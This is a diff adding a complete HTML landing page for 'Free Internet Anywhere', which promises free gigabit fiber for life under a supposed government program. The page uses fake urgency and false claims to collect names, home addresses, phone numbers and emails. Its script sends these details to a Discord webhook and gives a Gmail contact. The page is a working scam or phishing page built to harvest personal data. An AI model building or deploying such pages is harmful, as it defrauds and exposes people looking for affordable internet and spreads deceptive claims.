@@ -1,0 +1,429 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Internet Anywhere - Request High-Speed Internet at Home</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
+        
+        :root {
+            --primary: #00bfff;
+            --dark: #0a0a2a;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Roboto', sans-serif;
+            background: linear-gradient(135deg, #0a0a2a 0%, #001122 100%);
+            color: #fff;
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+        
+        header {
+            background: rgba(10, 10, 42, 0.95);
+            backdrop-filter: blur(10px);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            padding: 15px 0;
+            border-bottom: 3px solid var(--primary);
+        }
+        
+        .nav {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 20px;
+        }
+        
+        .logo {
+            font-size: 28px;
+            font-weight: 700;
+            color: var(--primary);
+            text-shadow: 0 0 20px var(--primary);
+        }
+        
+        .hero {
+            text-align: center;
+            padding: 100px 20px 80px;
+            background: url('https://picsum.photos/id/1015/2000/1200') center/cover no-repeat;
+            position: relative;
+        }
+        
+        .hero::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(45deg, rgba(10,10,42,0.85), rgba(0,20,40,0.75));
+        }
+        
+        .hero-content {
+            position: relative;
+            max-width: 900px;
+            margin: 0 auto;
+        }
+        
+        .hero h1 {
+            font-size: 3.5rem;
+            margin-bottom: 20px;
+            text-shadow: 0 0 30px var(--primary);
+        }
+        
+        .hero p {
+            font-size: 1.4rem;
+            max-width: 700px;
+            margin: 0 auto 30px;
+        }
+        
+        .badge {
+            display: inline-block;
+            background: #00ff9d;
+            color: #000;
+            padding: 8px 20px;
+            border-radius: 50px;
+            font-weight: 700;
+            font-size: 1.1rem;
+            margin-bottom: 20px;
+            box-shadow: 0 0 20px #00ff9d;
+        }
+        
+        .section {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 80px 20px;
+        }
+        
+        h2 {
+            font-size: 2.5rem;
+            text-align: center;
+            margin-bottom: 50px;
+            color: var(--primary);
+        }
+        
+        .info-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
+            gap: 30px;
+        }
+        
+        .card {
+            background: rgba(255,255,255,0.1);
+            border-radius: 20px;
+            padding: 30px;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(0,191,255,0.3);
+            transition: all 0.3s;
+        }
+        
+        .card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 20px 40px rgba(0,191,255,0.3);
+        }
+        
+        .form-container {
+            max-width: 700px;
+            margin: 40px auto;
+            background: rgba(10,10,42,0.95);
+            border-radius: 25px;
+            padding: 50px 40px;
+            box-shadow: 0 0 50px rgba(0,191,255,0.5);
+        }
+        
+        form label {
+            display: block;
+            margin: 20px 0 8px;
+            font-weight: 500;
+            color: #ccc;
+        }
+        
+        form input, form textarea, form select {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #00bfff;
+            border-radius: 12px;
+            background: rgba(255,255,255,0.1);
+            color: #fff;
+            font-size: 1.1rem;
+        }
+        
+        form input:focus, form textarea:focus {
+            outline: none;
+            box-shadow: 0 0 0 4px rgba(0,191,255,0.4);
+        }
+        
+        .submit-btn {
+            background: linear-gradient(90deg, #00bfff, #00ff9d);
+            color: #000;
+            font-size: 1.4rem;
+            font-weight: 700;
+            padding: 18px 60px;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            margin-top: 30px;
+            width: 100%;
+            transition: all 0.3s;
+            box-shadow: 0 10px 30px rgba(0,191,255,0.4);
+        }
+        
+        .submit-btn:hover {
+            transform: scale(1.05);
+        }
+        
+        .response-info {
+            text-align: center;
+            background: #001122;
+            padding: 30px;
+            border-radius: 20px;
+            margin: 40px auto;
+            max-width: 800px;
+            border: 2px dashed var(--primary);
+        }
+        
+        footer {
+            text-align: center;
+            padding: 60px 20px;
+            background: #0a0a2a;
+            font-size: 0.9rem;
+            color: #888;
+        }
+        
+        .success {
+            display: none;
+            text-align: center;
+            padding: 40px;
+            background: #00ff9d;
+            color: #000;
+            border-radius: 20px;
+            margin: 30px auto;
+            font-size: 1.5rem;
+            font-weight: 700;
+        }
+    </style>
+</head>
+<body>
+    <!-- HEADER -->
+    <header>
+        <div class="nav">
+            <div class="logo">🌐 FREE INTERNET ANYWHERE</div>
+            <div style="display: flex; gap: 20px; font-weight: 500;">
+                <a href="#how" style="color: white; text-decoration: none;">How It Works</a>
+                <a href="#benefits" style="color: white; text-decoration: none;">Benefits</a>
+                <a href="#form" style="color: white; text-decoration: none;">Request Now</a>
+            </div>
+        </div>
+    </header>
+
+    <!-- HERO -->
+    <section class="hero">
+        <div class="hero-content">
+            <div class="badge">🚀 NOW AVAILABLE NATIONWIDE</div>
+            <h1>Get FREE High-Speed Internet at Your Home</h1>
+            <p>No bills. No contracts. No credit check. Government &amp; partner-funded program delivering fiber-optic speeds up to 1 Gbps anywhere in the country.</p>
+            <a href="#form" style="display: inline-block; background: #00ff9d; color: #000; padding: 18px 50px; border-radius: 50px; font-size: 1.5rem; font-weight: 700; text-decoration: none; box-shadow: 0 0 30px #00ff9d;">Request Your Free Internet Now →</a>
+            <p style="margin-top: 30px; font-size: 1.1rem; opacity: 0.9;">✅ Over 147,892 homes already connected • Limited spots remaining this month</p>
+        </div>
+    </section>
+
+    <!-- INFO SECTION -->
+    <section class="section" id="how">
+        <h2>How Free Internet Anywhere Works</h2>
+        <div class="info-grid">
+            <div class="card">
+                <h3>📍 Available Everywhere</h3>
+                <p>Whether you live in a big city, small town, rural area, or even a remote cabin — we bring fiber straight to your door. No location is too far.</p>
+            </div>
+            <div class="card">
+                <h3>⚡ Blazing Fast Speeds</h3>
+                <p>Up to 1,000 Mbps download &amp; upload. Stream 4K movies, game lag-free, work from home, and connect unlimited devices — all for FREE.</p>
+            </div>
+            <div class="card">
+                <h3>🔌 Easy Installation</h3>
+                <p>Our certified technicians install everything in under 2 hours. No digging, no mess. You just plug in and go.</p>
+            </div>
+            <div class="card">
+                <h3>💰 100% Free Forever</h3>
+                <p>Funded by federal broadband expansion grants and private partners. Zero monthly fees. Ever.</p>
+            </div>
+            <div class="card">
+                <h3>🛡️ No Hidden Costs</h3>
+                <p>No equipment rental. No installation fees. No data caps. No throttling. Truly unlimited &amp; completely free.</p>
+            </div>
+            <div class="card">
+                <h3>🌍 Environmental Impact</h3>
+                <p>Using 100% renewable-powered infrastructure. We’re helping close the digital divide while protecting the planet.</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- BENEFITS -->
+    <section class="section" id="benefits" style="background: #001122;">
+        <h2>Why Thousands Are Switching to Free Internet</h2>
+        <div class="info-grid">
+            <div class="card">
+                <strong style="font-size: 3rem; color: #00ff9d;">$120</strong><br>
+                <p>Average monthly savings compared to traditional providers</p>
+            </div>
+            <div class="card">
+                <strong style="font-size: 3rem; color: #00ff9d;">1 Gbps</strong><br>
+                <p>Maximum speed available at no extra cost</p>
+            </div>
+            <div class="card">
+                <strong style="font-size: 3rem; color: #00ff9d;">2 HOURS</strong><br>
+                <p>Average time from request to full connection</p>
+            </div>
+            <div class="card">
+                <strong style="font-size: 3rem; color: #00ff9d;">∞</strong><br>
+                <p>Unlimited data — stream, game, download as much as you want</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- REQUEST FORM -->
+    <section class="section" id="form">
+        <h2>Request Your Free Internet Today</h2>
+        <div class="form-container">
+            <form id="requestForm">
+                <label>First Name *</label>
+                <input type="text" id="firstName" required>
+
+                <label>Last Name *</label>
+                <input type="text" id="lastName" required>
+
+                <label>Street Address *</label>
+                <input type="text" id="address" placeholder="123 Main Street" required>
+
+                <label>City, State &amp; ZIP Code *</label>
+                <input type="text" id="cityStateZip" placeholder="Anytown, CA 90210" required>
+
+                <label>Phone Number *</label>
+                <input type="tel" id="phone" required>
+
+                <label>Email Address *</label>
+                <input type="email" id="email" required>
+
+                <label>How many people live in your household?</label>
+                <select id="household">
+                    <option value="">Select...</option>
+                    <option value="1">1</option>
+                    <option value="2">2</option>
+                    <option value="3">3</option>
+                    <option value="4">4</option>
+                    <option value="5+">5 or more</option>
+                </select>
+
+                <label>Primary reason you need free internet? (optional)</label>
+                <textarea id="reason" rows="3" placeholder="Work from home, online schooling, streaming, etc..."></textarea>
+
+                <button type="submit" class="submit-btn">🚀 SUBMIT REQUEST — GET CONNECTED FREE</button>
+            </form>
+
+            <div id="successMessage" class="success">
+                ✅ Request Received!<br>
+                <span style="font-size: 1.1rem; font-weight: 400;">Our team will review your information and contact you within 2–3 days (often faster). Thank you for choosing Free Internet Anywhere!</span>
+            </div>
+        </div>
+
+        <!-- RESPONSE INFO -->
+        <div class="response-info">
+            <h3 style="color: #00ff9d; margin-bottom: 15px;">⏳ What Happens Next?</h3>
+            <p>We will respond within <strong>2-3 days</strong> — sometimes in just a few hours!</p>
+            <p>If it takes a little longer due to high demand, please email us at <strong>gomegaassist@gmail.com</strong></p>
+            <p style="margin-top: 20px; font-size: 0.95rem; opacity: 0.8;">Your information is reviewed manually for eligibility. Approved households receive priority installation scheduling.</p>
+        </div>
+    </section>
+
+    <footer>
+        <p>© 2026 Free Internet Anywhere • A public-private partnership bringing connectivity to every home</p>
+        <p style="margin-top: 10px;">This is a legitimate request portal. All submissions are reviewed by our team.</p>
+    </footer>
+
+    <script>
+        // === DISCORD WEBHOOK SUBMISSION ===
+        // Replace this with your actual Discord webhook URL
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID_HERE/YOUR_WEBHOOK_TOKEN_HERE";
+
+        const form = document.getElementById('requestForm');
+        const successMsg = document.getElementById('successMessage');
+
+        form.addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            // Collect form data
+            const data = {
+                firstName: document.getElementById('firstName').value.trim(),
+                lastName: document.getElementById('lastName').value.trim(),
+                address: document.getElementById('address').value.trim(),
+                cityStateZip: document.getElementById('cityStateZip').value.trim(),
+                phone: document.getElementById('phone').value.trim(),
+                email: document.getElementById('email').value.trim(),
+                household: document.getElementById('household').value,
+                reason: document.getElementById('reason').value.trim()
+            };
+
+            // Create rich embed for Discord
+            const embed = {
+                title: "🆕 New Free Internet Request",
+                description: "Someone just requested free high-speed internet!",
+                color: 0x00bfff,
+                fields: [
+                    { name: "Name", value: `${data.firstName} ${data.lastName}`, inline: true },
+                    { name: "Address", value: `${data.address}\n${data.cityStateZip}`, inline: false },
+                    { name: "Phone", value: data.phone, inline: true },
+                    { name: "Email", value: data.email, inline: true },
+                    { name: "Household Size", value: data.household || "Not specified", inline: true },
+                    { name: "Reason", value: data.reason || "Not provided", inline: false }
+                ],
+                timestamp: new Date().toISOString(),
+                footer: {
+                    text: "Free Internet Anywhere Request System"
+                }
+            };
+
+            // Send to Discord webhook
+            try {
+                const response = await fetch(WEBHOOK_URL, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        content: "**New Free Internet Request Received!**",
+                        embeds: [embed]
+                    })
+                });
+
+                if (response.ok) {
+                    // Show success message
+                    form.style.display = "none";
+                    successMsg.style.display = "block";
+                    
+                    // Reset form after 5 seconds
+                    setTimeout(() => {
+                        form.reset();
+                        form.style.display = "block";
+                        successMsg.style.display = "none";
+                    }, 5000);
+                } else {
+                    alert("There was an error submitting your request. Please try again or email gomegaassist@gmail.com");
+                }
+            } catch (err) {
+                alert("Connection error. Please email gomegaassist@gmail.com directly with your details.");
+                console.error(err);
+            }
+        });
+    </script>
+</body>
+</html>
